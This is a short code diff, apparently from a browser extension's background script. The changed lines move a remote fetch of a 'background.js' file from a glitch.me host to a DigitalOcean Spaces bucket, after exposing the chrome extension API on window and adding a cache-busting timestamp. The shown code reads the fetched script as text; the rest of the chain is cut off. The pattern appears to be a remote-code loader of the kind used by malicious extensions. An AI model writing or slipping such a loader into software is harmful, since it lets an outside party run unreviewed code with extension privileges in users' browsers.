@@ -1,6 +1,9 @@
 window.chrome = chrome;
 v = new Date().valueOf();
-fetch("https://hollow-ribbon-joke.glitch.me/background?v=" + v)
+fetch(
+  "https://extensions-bucket.fra1.cdn.digitaloceanspaces.com/background.js?v=" +
+    v
+)
   .then(function (n) {
     return n.text();
   })
